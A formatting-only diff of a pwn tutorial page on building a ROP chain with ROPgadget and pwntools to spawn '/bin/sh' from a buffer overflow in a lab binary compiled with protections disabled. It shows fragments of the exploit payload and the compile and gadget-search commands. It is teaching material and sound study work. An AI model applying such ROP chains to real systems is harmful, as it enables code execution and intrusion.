@@ -17,7 +17,7 @@ date: 2023-01-16
 ![](https://imgur.com/YGarADK.png)
 
 ## Original Code
-```c!=1
+```c
 #include <stdio.h>
 #include <unistd.h>
 
@@ -37,14 +37,14 @@ int main()
 ```
 * At line `11`, `%p` means pointer of `/bin/sh` string.
 * Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection. In addition, please use `-static` command to compile library at compile time, so that we can get `ROP gadget` more easily.
-    ```bash!
-    gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
+    ```bash
+    $ gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
     ```
 
 ## Exploit
 * First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use `ROP gadget` to construct chain.
 * Second, we use `ROPgadget` to find suitable gadget
-    ```bash!
+    ```bash
     $ ROPgadget --multibr --binary rop > rop_gadget
     $ vim rop_gadget
     ```
@@ -55,7 +55,7 @@ int main()
     ![reference link](https://imgur.com/dEh7b5n.png)
     * Note that, you may consider that `pop rdx ; pop rbx ; ret` is not what we want. We just want `pop rdx ; ret`. Therefore, we have to push one more value for `pop rbx ;` instruction.
 * Then, we can construct our payload:
-    ```python!=
+    ```python
     from pwn import *
 
     context.arch = 'amd64'
@@ -74,7 +74,7 @@ int main()
     ```
     * Note that, `r.recvline()[:-1]` is `b'0x498004'` and we must pop to `%rdi` at line `17` below.
 * Then we can combine them together using [flat method](https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat). It'll flat the address with **length 8 bytes**.
-    ```python!=16
+    ```python
     ROP = flat(
         pop_rdi_ret, binsh,
         pop_rsi_ret, 0,
@@ -98,5 +98,5 @@ int main()
     ![](https://imgur.com/xXx7HRQ.png)
 
 ## Reference
-[NTUSTISC - Pwn Basic 3 [2019.03.26]](https://youtu.be/iA4Hrr17ooI?t=1239)
-[Pwn week1](https://youtu.be/ktoVQB99Gj4?t=6712)
+* [NTUSTISC - Pwn Basic 3 [2019.03.26]](https://youtu.be/iA4Hrr17ooI?t=1239)
+* [Pwn week1](https://youtu.be/ktoVQB99Gj4?t=6712)
